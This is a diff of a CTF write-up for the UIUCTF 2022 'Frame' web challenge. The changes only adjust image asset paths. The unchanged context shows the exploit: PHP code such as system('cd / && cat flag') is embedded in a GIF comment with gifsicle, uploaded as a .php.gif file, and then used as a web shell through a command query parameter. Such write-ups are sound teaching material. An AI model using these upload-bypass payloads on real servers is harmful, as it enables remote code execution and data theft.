@@ -1,10 +1,10 @@
-# UIUCTF 2022 (web)
+# UIUCTF 2022
 
 ## Frame
 
 ### [source](https://github.com/GiongfNef/ChallFile/blob/main/UIUCTF2022/frame/handout.tar)
 
-![chall](<../.gitbook/assets/image (6) (3).png>)
+![chall](<../../.gitbook/assets/image (6) (3).png>)
 
 ### Analysis
 
@@ -53,7 +53,7 @@ error_reporting(E_ALL);
 * Firstly, we convert png file that we received from chall to gif file
 * I have tried change file extension from png to gif but it doesn't work, of course.
 
-![](<../.gitbook/assets/image (3) (3).png>)
+![](<../../.gitbook/assets/image (3) (3).png>)
 
 * I convert by [online tool](https://cloudconvert.com/png-to-gif) and ... that works. After we that just use this command:
 
@@ -63,11 +63,11 @@ gifsicle < frame-1.gif --comment "<?php system('id'); ?>" > output.php.gif
 
 * Upload the output gif to server:
 
-![the path of our requesting](<../.gitbook/assets/image (9) (3).png>)
+![the path of our requesting](<../../.gitbook/assets/image (9) (3).png>)
 
 Go to that path and get some interesting things:
 
-![](<../.gitbook/assets/image (1) (2) (2).png>)
+![](<../../.gitbook/assets/image (1) (2) (2).png>)
 
 * It works, try other commands to rce :
 
@@ -75,7 +75,7 @@ Go to that path and get some interesting things:
 gifsicle < frame-1.gif --comment "<?php system('ls /'); ?>" > output.php.gif
 ```
 
-![Here yah gooooo](<../.gitbook/assets/image (4) (3).png>)
+![Here yah gooooo](<../../.gitbook/assets/image (4) (3).png>)
 
 * Now just use rce command and got the flag:
 
@@ -83,11 +83,11 @@ gifsicle < frame-1.gif --comment "<?php system('ls /'); ?>" > output.php.gif
 gifsicle < frame-1.gif --comment "<?php system('cd / && cat flag'); ?>" > output.php.gif
 ```
 
-![](<../.gitbook/assets/image (2) (1) (2).png>)
+![](<../../.gitbook/assets/image (2) (1) (2).png>)
 
 flag in some confusing thing like this:
 
-![](<../.gitbook/assets/image (1) (1) (2).png>)
+![](<../../.gitbook/assets/image (1) (1) (2).png>)
 
 #### Firstway but easier \~
 
@@ -99,7 +99,7 @@ Now we can rce ez by web shell
 
 > /uploads/c654036b5974c786-output.php.gif?command=ls%20-a
 
-![](<../.gitbook/assets/image (1) (1) (3).png>)
+![](<../../.gitbook/assets/image (1) (1) (3).png>)
 
 
 
